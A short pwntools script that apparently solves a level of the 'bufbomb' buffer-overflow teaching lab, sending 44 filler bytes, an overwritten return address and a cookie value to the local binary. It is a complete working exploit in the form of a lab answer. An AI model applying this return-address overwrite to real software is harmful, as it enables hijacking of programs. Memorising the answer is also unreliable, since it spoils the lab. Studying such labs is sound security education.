from pwn import *

io = process(["./bufbomb", "-u", "2212080197"])
io.sendline(b"1"*44+b'\x42' + b'\x8c' + b'\x04' + b'\x08' + b'1'*4 + b'\x6d' + b'\xb2' + b'\x62' + b'\x39')
data = io.recv()
print(data)
